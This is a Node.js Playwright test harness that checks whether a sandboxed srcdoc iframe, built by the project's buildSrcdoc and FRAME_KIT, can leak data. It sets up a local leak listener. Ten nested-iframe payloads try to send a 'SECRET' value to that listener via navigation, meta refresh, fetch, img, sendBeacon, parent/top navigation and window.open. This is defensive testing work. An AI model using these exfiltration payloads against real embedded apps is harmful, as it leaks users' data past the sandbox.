import http from 'node:http';
import { createRequire } from 'node:module';
const require = createRequire('/home/uni/Code/uni-app-contract/package.json');
const { chromium } = require('@playwright/test');
const { buildSrcdoc: __b } = await import('../../src/interface/srcdoc.ts'); const { FRAME_KIT } = await import('../../src/interface/kits/frameKit.ts'); const buildSrcdoc = (h) => __b(h, { kitSource: FRAME_KIT, headExtra: '' });
let hostBody='';
http.createServer((q,r)=>{r.writeHead(200,{'content-type':'text/html',...(process.env.NOHOSTCSP?{}:{'content-security-policy':'frame-src about:'})});r.end(hostBody)}).listen(1467);
const hits=[]; http.createServer((q,r)=>{hits.push(q.url);r.writeHead(200,{'content-type':'text/html'});r.end('ok')}).listen(1466);
const L='http://127.0.0.1:1466/leak';
const child = (inner) => `<body><script>var f=document.createElement('iframe');f.srcdoc=${JSON.stringify(inner).replace(/<\/script>/g,'<\\/script>')};document.body.appendChild(f)</script>`;
const cases = {
  childSelfNav: child(`<script>location.href='${L}?childself=SECRET'</script>`),
  childMeta: child(`<meta http-equiv=refresh content="0;url=${L}?childmeta=SECRET">`),
  childAnchor: child(`<a id=a href="${L}?childa=SECRET">x</a><script>a.click()</script>`),
  childFetch: child(`<script>fetch('${L}?childfetch=SECRET',{mode:'no-cors'}).catch(function(){})</script>`),
  childImg: child(`<img src="${L}?childimg=SECRET">`),
  childBeacon: child(`<script>navigator.sendBeacon('${L}?childbeacon=SECRET','x')</script>`),
  childOfChildRtc: child(`<script>document.write('x')</script>`),
  // parent (child) nav of the app frame itself from the child
  childNavsParent: child(`<script>try{parent.location.href='${L}?childparent=SECRET'}catch(e){}</script>`),
  childNavsTop: child(`<script>try{top.location.href='${L}?childtop=SECRET'}catch(e){}</script>`),
  childWindowOpen: child(`<script>try{window.open('${L}?childopen=SECRET')}catch(e){}</script>`),
};
const b = await chromium.launch(); const p = await b.newPage();
for (const [n, body] of Object.entries(cases)) {
  hits.length=0;
  hostBody = `<!doctype html><body><iframe sandbox="allow-scripts" id=f></iframe><script>document.getElementById('f').srcdoc=${JSON.stringify(buildSrcdoc(body)).replace(/</g,"\\u003c")}</script>`;
  await p.goto('http://127.0.0.1:1467/'); await p.waitForTimeout(2000);
  console.log(n.padEnd(18), JSON.stringify(hits));
}
await b.close(); process.exit(0);
